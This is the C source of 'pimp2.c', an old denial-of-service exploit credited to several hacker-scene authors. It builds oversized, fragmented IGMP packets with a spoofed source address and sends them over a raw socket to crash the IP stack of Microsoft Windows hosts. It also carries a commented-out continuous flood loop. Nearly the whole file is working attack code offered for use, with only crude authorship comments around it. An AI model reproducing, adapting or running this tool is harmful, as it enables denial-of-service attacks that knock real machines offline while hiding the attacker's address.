/*
** pimp.c 6/4/99 by Rob Mosher: nyt@deadpig.org
** exploits bug in m$'s ip stack
** rewrite by nyt@EFnet
** bug found by klepto
** usage: pimp <host>
** CRY what messy fucking code.
** now for the gay modification :p
** ** ** ** ** ** ** ** ** ** **/
/**
 ** [gH] pimp2.c by icesk. [gH]
 **
 ** Modified for use with toast by Gridmark
 ** 
 ** well so much for readble code.
 ** 1. cleaned up the code (prolly took me the longest heh)
 ** 2. add'd src_addr suport.
 ** 3. allows suport of differant igmp2 codes.
 ** 4. interval into wich to send packets (microseconds)
 **/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <sys/socket.h>

struct igmp
{
        unsigned char igmp_type;
        unsigned char igmp_code;
        unsigned short igmp_cksum;
        struct in_addr igmp_group;
};

#define ERROR(a) {printf("%s\n", a);exit(-1);}

u_long  resolve(char *);

int main(int argc, char *argv[])
{
 int nsock, ctr, flud;
 char *pkt, *data;
 struct ip *nip;
 struct igmp *nigmp;
 struct sockaddr_in s_addr_in;

 flud = 0;
 setvbuf(stdout, NULL, _IONBF, 0);
 if(argc != 6) ERROR("pimp2.c by icesk.\n<dest_addr> <num> <src_addr> <igmp code; pimp: 31> <interval>");

 if(atoi(argv[2]) == 0) { flud = 1; }
 nsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 pkt = malloc(1500);

 memset(&s_addr_in, 0, sizeof(s_addr_in));
 memset(pkt, 0, 1500);

 nip = (struct ip *) pkt;
 nigmp = (struct igmp *) (pkt + sizeof(struct ip));
 data = (char *)(pkt + sizeof(struct ip) + sizeof(struct igmp));
 memset(data, 'A', 1500-(sizeof(struct ip) + sizeof(struct igmp)));

 s_addr_in.sin_addr.s_addr = resolve(argv[1]);

 nip->ip_v  = 4;
 nip->ip_hl  = 5;
 nip->ip_tos  = 0;
 nip->ip_id  = 69;
 nip->ip_ttl  = 255;
 nip->ip_p  = IPPROTO_IGMP;
 nip->ip_sum  = 0;
 nip->ip_dst.s_addr = s_addr_in.sin_addr.s_addr;
 nip->ip_src.s_addr = resolve(argv[3]);
 nigmp->igmp_type = 2;
 nigmp->igmp_code = atoi(argv[4]);
 nigmp->igmp_cksum = 0;

 inet_aton("128.1.1.1", &nigmp->igmp_group);

 for(ctr = 0;ctr < atoi(argv[2]);ctr++) {
   printf("...\r");
   nip->ip_len  = 1500;
   nip->ip_off  = htons(IP_MF);
   sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));
   nip->ip_off  = htons(1480/8)|htons(IP_MF);
   sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));
   nip->ip_off  = htons(5920/8)|htons(IP_MF);
   sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));
   nip->ip_len   = 831;
   nip->ip_off  = htons(7400/8);
   sendto(nsock, pkt, 831, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));
 }
/* {
  printf("packets sent\nentering flood mode to finish it off [crtl+c to finish]\n");
  while(1){
    nip->ip_len  = 1500;
    nip->ip_off  = htons(IP_MF);
    sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));
    usleep(atoi(argv[5]));
    nip->ip_off  = htons(1480/8)|htons(IP_MF);
    sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));
    usleep(atoi(argv[5]));
    nip->ip_off  = htons(5920/8)|htons(IP_MF);
    sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));
    usleep(atoi(argv[5]));
    nip->ip_len   = 831;
    nip->ip_off  = htons(7400/8);
    sendto(nsock, pkt, 831, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));
    usleep(atoi(argv[5]));
  } */
  shutdown(nsock, 2);
 }

u_long resolve(char *host)
{
        struct hostent *he;
        u_long ret;

        if(!(he = gethostbyname(host)))
        {
                herror("gethostbyname()");
                exit(-1);
        }
        memcpy(&ret, he->h_addr, sizeof(he->h_addr));
        return ret;
}

/*EOF*/
